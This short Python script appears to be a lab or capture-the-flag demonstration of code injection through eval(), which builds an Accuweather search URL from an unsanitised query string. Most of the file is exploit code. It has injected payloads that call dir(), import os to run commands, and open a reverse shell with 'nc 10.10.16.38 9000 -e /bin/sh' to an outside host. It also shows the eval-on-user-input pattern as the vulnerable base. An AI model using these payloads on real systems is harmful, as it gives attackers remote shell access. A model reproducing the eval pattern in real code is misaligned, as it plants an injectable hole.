from enum import Enum
from urllib.parse import quote
import click

class Engine(Enum):
    Accuweather = "https://www.accuweather.com/en/search-locations?query={query}"


    def search(self, query):
        url = self.value.format(query=quote(query, safe=""))
        return url

# ## NORMAL USE ##
# engine='Accuweather'
# query='facebook'
# url=eval(f"Engine.{engine}.search('{query}')")
# click.echo(url)

## Inject Code in {Engine}
# engine=dir()
# query='facebook'
# url=eval(f"Engine.{engine}.search('{query}')")
# click.echo(url)

## Inject code in {query}
engine='Accuweather'
query1="hey')#"
query2="hey'),dir()#"
query3="hey'),__import__(\"os\").getcwd()#"
query="hey'),'__import__(\"os\").system(\"nc 10.10.16.38 9000 -e /bin/sh\")'#"
url=eval(f"Engine.{engine}.search('{query}')")
click.echo(url)


